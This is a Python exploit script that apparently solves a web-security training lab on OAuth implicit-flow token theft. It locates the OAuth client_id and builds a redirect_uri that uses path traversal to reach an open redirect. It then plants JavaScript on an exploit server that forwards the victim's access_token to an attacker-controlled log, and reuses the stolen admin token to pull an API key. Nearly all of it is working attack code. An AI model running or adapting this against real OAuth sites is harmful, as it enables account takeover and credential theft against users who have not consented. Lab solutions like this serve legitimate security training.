#!/usr/bin/env python3

import requests
import re
import sys
import time
import urllib3
from urllib.parse import urlparse, parse_qs, quote
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

OAUTH_URL_RE = re.compile(r"https://oauth-[a-z0-9]+\.[a-z0-9.-]+/auth\?[^\"'<>\s]+")


def get_exploit_host(s, url):
    r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", attrs={"id": "exploit-link"})
    if not link:
        return None
    return link["href"].rstrip("/")


def get_oauth_details(s, url):
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)

    link = None
    soup = BeautifulSoup(r.text, "html.parser")
    anchor = soup.find("a", href=re.compile(r"/auth\?"))
    if anchor:
        link = anchor["href"]
    else:
        match = OAUTH_URL_RE.search(r.text)
        if match:
            link = match.group(0)

    if not link:
        print("[-] Could not locate OAuth link. First 800 chars of /my-account:")
        print(r.text[:800])
        return None, None

    oauth_url = urlparse(link)
    oauth_host = f"{oauth_url.scheme}://{oauth_url.netloc}"
    params = parse_qs(oauth_url.query)
    client_id = params.get("client_id", [None])[0]
    return oauth_host, client_id


def build_exploit_html(oauth_host, client_id, url, exploit_host):
    exploit_target = f"{exploit_host}/exploit"
    redirect_uri = f"{url}/oauth-callback/../post/next?path={exploit_target}"
    auth_url = (
        f"{oauth_host}/auth?client_id={client_id}"
        f"&redirect_uri={quote(redirect_uri, safe='')}"
        f"&response_type=token&nonce=112233&scope=openid%20profile%20email"
    )

    return f"""<script>
if (!document.location.hash) {{
    document.location = "{auth_url}";
}} else {{
    let params = new URLSearchParams(document.location.hash.substring(1));
    document.location = "/log?access_token=" + params.get("access_token");
}}
</script>"""


def store_exploit(s, exploit_host, html_body):
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": html_body,
        "formAction": "STORE",
    }
    r = s.post(exploit_host, data=data, verify=False, proxies=proxies, timeout=10)
    return r.status_code == 200


def deliver_to_victim(s, exploit_host):
    r = s.get(f"{exploit_host}/deliver-to-victim", allow_redirects=False,
              verify=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def get_leaked_token(s, exploit_host):
    r = s.get(f"{exploit_host}/log", verify=False, proxies=proxies, timeout=10)
    matches = re.findall(r'access_token=([^&\s"<]+)', r.text)
    return matches[-1] if matches else None


def get_api_key(s, url, oauth_host, token):
    headers = {"Authorization": f"Bearer {token}"}

    for host in (oauth_host, url):
        r = s.get(f"{host}/me", headers=headers, verify=False, proxies=proxies, timeout=10)
        if r.status_code == 404:
            continue

        match = re.search(r'"apikey"\s*:\s*"([^"]+)"', r.text, re.IGNORECASE)
        if match:
            print(f"[+] Found apiKey via {host}/me")
            return match.group(1)

        try:
            body = r.json()
            if isinstance(body, dict):
                for key, value in body.items():
                    if key.lower() == "apikey" and value:
                        print(f"[+] Found apiKey via {host}/me")
                        return value
        except ValueError:
            pass

        print(f"[-] {host}/me responded (status {r.status_code}) but no apiKey found:")
        print(r.text[:800])

    return None


def submit_solution(s, exploit_host, api_key):
    r = s.post(f"{exploit_host}/submitSolution", data={"answer": api_key},
               verify=False, proxies=proxies, timeout=10)
    return r.status_code == 200


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
        if "Congratulations" in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    url = sys.argv[1].strip().rstrip("/")
    s = requests.Session()

    exploit_host = get_exploit_host(s, url)
    if not exploit_host:
        print("[-] Failed to find exploit server link")
        return False
    print(f"[+] Found exploit server: {exploit_host}")

    oauth_host, client_id = get_oauth_details(s, url)
    if not oauth_host or not client_id:
        print("[-] Failed to obtain oauth-server host or client_id")
        return False
    print(f"[+] OAuth host: {oauth_host}, client_id: {client_id}")

    exploit_html = build_exploit_html(oauth_host, client_id, url, exploit_host)

    if not store_exploit(s, exploit_host, exploit_html):
        print("[-] Failed to store exploit")
        return False
    print("[+] Stored exploit")

    if not deliver_to_victim(s, exploit_host):
        print("[-] Failed to deliver exploit to victim")
        return False
    print("[+] Delivered exploit to victim (admin)")
    time.sleep(3)

    token = get_leaked_token(s, exploit_host)
    if not token:
        print("[-] Failed to find a leaked access_token in the access log")
        return False
    print(f"[+] Stole admin's access token: {token}")

    api_key = get_api_key(s, url, oauth_host, token)
    if not api_key:
        print("[-] Failed to retrieve API key from /me")
        return False
    print(f"[+] Obtained admin's API key: {api_key}")

    if not submit_solution(s, exploit_host, api_key):
        print("[-] Failed to submit solution")
        return False
    print("[+] Submitted solution")

    check_solved(s, url)


if __name__ == "__main__":
    main()